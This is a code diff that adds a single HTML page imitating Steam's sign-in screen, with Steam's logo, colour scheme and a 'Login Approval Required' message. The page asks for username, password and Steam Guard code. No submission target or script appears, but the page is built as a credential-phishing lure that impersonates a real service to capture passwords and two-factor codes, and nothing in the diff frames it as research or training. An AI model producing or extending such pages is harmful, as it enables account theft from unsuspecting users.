@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Steam Login</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #171a21;
+            color: #c6d4df;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .login-container {
+            background-color: #1b2838;
+            padding: 20px;
+            border-radius: 5px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
+            width: 300px;
+            text-align: center;
+        }
+        .logo {
+            margin-bottom: 20px;
+        }
+        .logo img {
+            width: 180px;
+        }
+        .input-group {
+            margin-bottom: 15px;
+            text-align: left;
+        }
+        .input-group label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 8px;
+            background-color: #316282;
+            border: 1px solid #316282;
+            border-radius: 3px;
+            color: #fff;
+        }
+        .login-button {
+            background-color: #5c7e10;
+            color: #fff;
+            border: none;
+            padding: 10px 15px;
+            border-radius: 3px;
+            cursor: pointer;
+            width: 100%;
+            font-weight: bold;
+        }
+        .login-button:hover {
+            background-color: #6b8c1c;
+        }
+        .auth-message {
+            background-color: #2a475e;
+            padding: 15px;
+            margin-bottom: 15px;
+            border-radius: 3px;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="logo">
+            <img src="https://store.akamai.steamstatic.com/public/shared/images/header/logo_steam.svg?t=962016" alt="Steam">
+        </div>
+        <div class="auth-message">
+            <h3>Login Approval Required</h3>
+            <p>Please confirm your login attempt by entering your Steam Guard code or approving the request via the Steam Mobile App.</p>
+        </div>
+        <div class="input-group">
+            <label for="username">Username</label>
+            <input type="text" id="username" name="username" placeholder="Enter your username">
+        </div>
+        <div class="input-group">
+            <label for="password">Password</label>
+            <input type="password" id="password" name="password" placeholder="Enter your password">
+        </div>
+        <div class="input-group">
+            <label for="steamguard">Steam Guard Code</label>
+            <input type="text" id="steamguard" name="steamguard" placeholder="Enter Steam Guard code">
+        </div>
+        <button class="login-button">Sign In</button>
+    </div>
+</body>
+</html>
